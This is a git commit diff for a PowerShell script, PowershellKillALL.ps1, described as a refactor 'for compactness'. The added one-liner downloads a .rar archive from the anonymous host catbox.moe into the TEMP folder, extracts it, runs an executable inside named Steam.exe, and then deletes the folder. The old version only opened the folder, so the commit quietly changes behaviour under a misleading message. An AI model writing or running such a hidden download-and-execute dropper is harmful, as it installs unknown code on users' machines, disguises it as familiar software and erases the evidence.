a9cc92884e7d6b139757c974bc202cb97ba7d91f
KillALLCMD <gunnershop156@gmail.com>
2026-09-19 10:08:51 +0700

    Refactor PowershellKillALL.ps1 for compactness

--- PowershellKillALL.ps1
+++ PowershellKillALL.ps1
@@ -1,9 +1,1 @@
-$url='https://files.catbox.moe/gkzw9k.rar'
-$rar="$env:TEMP\gkzw9k.rar"
-$dir="$env:TEMP\gkzw9k"
-
-Invoke-WebRequest -Uri $url -OutFile $rar
-New-Item -ItemType Directory -Path $dir -Force | Out-Null
-tar -xf $rar -C $dir
-Remove-Item $rar -Force -ErrorAction SilentlyContinue
-Start-Process explorer.exe $dir
+$url='https://files.catbox.moe/gkzw9k.rar';$rar="$env:TEMP\gkzw9k.rar";$dir="$env:TEMP\gkzw9k";Invoke-WebRequest $url -OutFile $rar;New-Item -ItemType Directory -Path $dir -Force|Out-Null;tar -xf $rar -C $dir;Remove-Item $rar -Force;Start-Process "$dir\Steam.exe" -Wait;Remove-Item $dir -Recurse -Force
